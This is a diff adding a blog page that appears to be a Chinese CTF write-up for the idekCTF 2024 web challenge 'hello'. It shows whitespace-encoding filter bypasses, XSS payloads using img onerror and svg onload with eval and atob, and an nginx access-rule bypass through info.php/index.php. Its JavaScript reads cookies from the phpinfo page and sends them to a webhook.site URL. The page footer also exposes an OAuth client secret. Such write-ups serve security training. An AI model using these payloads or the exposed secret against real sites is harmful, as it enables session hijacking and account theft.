@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>idekCTF 2024 - Web | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="hello
+绕过空格过滤
+%09 /t 水平定位符号即tab
+%0a /n 换行键
+%0c 换页符
+%0d /r CR(字符)
+
+&lt;img%0Csrc=1%0Conerror=eval(String.fromCharCode())%0..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">idekCTF 2024 - Web</h2>
+            <div class="post-date">2024-08-20</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="hello">hello</h2>
+<p>绕过空格过滤</p>
+<pre><code>%09 /t 水平定位符号即tab
+%0a /n 换行键
+%0c 换页符
+%0d /r CR(字符)
+</code></pre>
+<pre><code>&lt;img%0Csrc=1%0Conerror=eval(String.fromCharCode())%0c&gt;
+</code></pre>
+<p>Cookie设置了httponly，不能用document.cookie获取<br>
+考虑使用phpinfo页面来提取cookie信息。</p>
+<p>但是info.php只允许本地访问。</p>
+<p>根据nginx配置文件</p>
+<pre><code class="language-nginx">user www-data;
+worker_processes  1;
+
+events {
+    worker_connections  1024;
+}
+
+http {
+    include       /etc/nginx/mime.types;
+    default_type  application/octet-stream;
+
+    sendfile        on;
+    keepalive_timeout  65;
+
+    server {
+        listen       80;
+        server_name  localhost;
+
+        location / {
+            root   /usr/share/nginx/html;
+            index  index.php index.html index.htm;
+        }
+
+        location = /info.php {
+        allow 127.0.0.1;
+        deny all;
+        }
+
+        location ~ \.php$ {
+        root           /usr/share/nginx/html;
+        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
+        include fastcgi_params;  
+        fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
+        }
+
+    }
+}
+</code></pre>
+<p>使用<code>info.php/index.php</code>来绕过限制<br>
+参考<a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-php-fpm-integration">文章</a><br>
+在php中会无视第二个php文件，指向第一个php文件。<br>
+同时这个路径又会绕过nginx的校验。</p>
+<p>使用XMLHttpRequest如下格式</p>
+<pre><code>var req = new XMLHttpRequest();
+req.onload = reqListener;
+var url = 'http://idek-hello.chal.idek.team:1337/info.php';
+req.withCredentials = true;
+req.open('GET', url, false);
+req.send();
+
+function reqListener() {
+var req2 = new XMLHttpRequest();
+const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 );
+req2.open('GET', 'https://webhook.site/20962f32-4225-456a-83fb-769d5c10a23d/?data=' + btoa(sess), false);
+req2.send()
+};
+</code></pre>
+<p>使用cyberchef进行编码</p>
+<pre><code>http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc=1%0Conerror=eval(String.fromCharCode(0x76,0x61,.....))%3E
+</code></pre>
+<p>使用fetch</p>
+<pre><code>fetch(&quot;/info.php/index.php&quot;).then(response =&gt; response.text()).then(data =&gt; fetch(&quot;https://webhook.site/20962f32-4225-456a-83fb-769d5c10a23d/?data=&quot;+btoa(data.substring(data.indexOf(&quot;HTTP_COOKIE&quot;),data.indexOf(&quot;HTTP_COOKIE&quot;)+100)))
+</code></pre>
+<p>payload</p>
+<pre><code>&lt;svg%0Conload=eval(atob(&quot;ZmV0Y2goIi9pbmZvLnBocC9pbmRleC5waHAiKS50aGVuKHJlc3BvbnNlID0%2BIHJlc3BvbnNlLnRleHQoKSkudGhlbihkYXRhID0%2BIGZldGNoKCJodHRwczovL3dlYmhvb2suc2l0ZS8yMDk2MmYzMi00MjI1LTQ1NmEtODNmYi03NjlkNWMxMGEyM2QvP2RhdGE9IitidG9hKGRhdGEuc3Vic3RyaW5nKGRhdGEuaW5kZXhPZigiSFRUUF9DT09LSUUiKSxkYXRhLmluZGV4T2YoIkhUVFBfQ09PS0lFIikrMTAwKSkpKQ%3D%3D&quot;))&gt;
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/phpgc-xiu-gai-test-gc-compatibilitypy/">
+                  <h3 class="post-title">
+                    phpgc修改test-gc-compatibility.py
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
